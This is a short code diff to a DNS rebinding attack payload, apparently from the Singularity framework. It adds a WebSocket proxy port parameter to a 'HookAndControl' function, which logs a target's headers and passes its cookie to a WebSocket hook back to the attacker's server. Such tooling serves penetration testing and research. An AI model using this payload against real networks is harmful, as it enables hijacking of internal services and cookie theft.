@@ -7,7 +7,7 @@ were working from the target environment.
 const HookAndControl = () => {
 
     // Invoked after DNS rebinding has been performed
-    function attack(headers, cookie, body) {
+    function attack(headers, cookie, body, wsProxyPort) {
         if (headers !== null) {
             console.log(`Origin: ${window.location} headers: ${httpHeaderstoText(headers)}`);
         };
@@ -19,7 +19,7 @@ const HookAndControl = () => {
         };
 
         // establish ws connection to Singularity server
-			webSocketHook(cookie, 10);
+			webSocketHook(cookie, wsProxyPort, 10);
     }
 
     // Invoked to determine to detect whether the rebinded service
